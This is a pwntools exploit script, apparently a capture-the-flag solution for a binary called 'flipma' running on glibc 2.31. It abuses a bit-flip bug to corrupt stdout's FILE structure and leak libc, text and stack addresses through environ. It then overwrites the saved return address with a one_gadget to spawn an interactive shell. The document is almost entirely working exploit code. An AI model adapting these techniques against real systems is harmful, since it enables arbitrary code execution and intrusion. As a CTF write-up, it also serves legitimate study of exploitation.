#!/bin/python3

from pwn import *

elf = ELF("./flipma_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = elf
proc = process([elf.path])

def debugger(): 
    pause()
    gdb.attach(proc, gdbscript="heap chunks", gdb_args=["-ix", "/home/kaligula/.gdbinit_pwndbg"])
    pause()

def flip(offset, bit): 
    proc.sendlineafter(b"a: ", str(offset).encode('utf-8'))
    proc.sendlineafter(b"b: ", str(bit).encode('utf-8'))
    
def write(addr, original, new): 
    addr_offset = addr - libc_stdin
    count = 0
    for i in range(8): 
        for j in range(8): 
            if (original >> (i*8+j)) & 1 != (new >> (i*8+j)) & 1:
                flip(addr_offset + i, j)
                count += 1
    return count

## Overwrite LSB of _IO_write_base of stdout to 0 to mess with puts
## _IO_write_base != _IO_write_ptr

flip(1337, 1337)
flip(0xd40+1, 5)
flip(0xd30+1, 5)
flip(1337, 1337)
leak = proc.recvuntil(b"we")

text_leak = u64(leak[2085:2091] + b"\x00\x00")
log.info("Text leak: " + hex(text_leak))
text_base = text_leak - 0x4020
log.info("Text base: " + hex(text_base))
counter = text_base + 0x4010
log.info("Flip counter: " + hex(counter))

libc_leak = u64(leak[5:11] + b"\x00\x00")
log.info("Libc leak: " + hex(libc_leak))
libc_base = libc_leak - 0x157f10
log.info("Libc base: " + hex(libc_base))
libc_stdin = libc_base + 0x1ec980
log.info("Stdin address: " + hex(libc_stdin))
libc_stdout = libc_base + 0x1ed6a0
log.info("Stdout address: " + hex(libc_stdout))

## Ok apparently you cannot directly leak stack_base like that because the offset from the ret addr keeps changing
#stack_leak = u64(leak[7461:7467] + b"\x00\x00")
#log.info("Stack leak: " + hex(stack_leak))
#stack_base = stack_leak - 0x2021e
#log.info("Stack base: " + hex(stack_base))
#stack_ret = stack_base + 0x1f968
#log.info("Stack return address: " + hex(stack_ret))

offset = b"-" + str(libc_stdin - counter - 1).encode('utf-8')

## Make flips some stupidly gigantic number -- in this case it would be 0x8001
proc.sendlineafter(b"a: ", offset)
proc.sendlineafter(b"b: ", b"7")

## Mess with stdout again to leak stack using libc environ
log.info("Original value in stdout fields: " + hex(libc_base + 0x1ed723))
flip_counter = 0
flip_counter += write(libc_stdout+2*8, libc_base + 0x1ed723, libc_base + libc.sym["environ"])
flip_counter += write(libc_stdout+4*8, libc_base + 0x1ed723, libc_base + libc.sym["environ"])
flip_counter += write(libc_stdout+5*8, libc_base + 0x1ed723, libc_base + libc.sym["environ"] + 0x10)
flip(1337, 1337)
leak2 = proc.recvuntil(b"we")

stack_leak = u64(leak2[0:6] + b"\x00\x00")
log.info("Stack leak: " + hex(stack_leak))
stack_ret = stack_leak - 0x100
log.info("Stack return address: " + hex(stack_ret))

## Overwrite stack return address (__libc_start_main+243) with one_gadget 
flip_counter += write(stack_ret, libc_base + 0x24083, libc_base + 0xe3b01)

## Zero the counter
flip_counter += write(counter, 0x7f00, 0x0)
flips_left = (0x8001 - flip_counter) & 0xff
log.info("Flips left: " + hex(flips_left))

for i in range(flips_left-1): 
    flip((counter+8)-libc_stdin, 1)
    
#debugger()

## Final flip
flip((counter+8)-libc_stdin, 1)

proc.interactive()
proc.close()
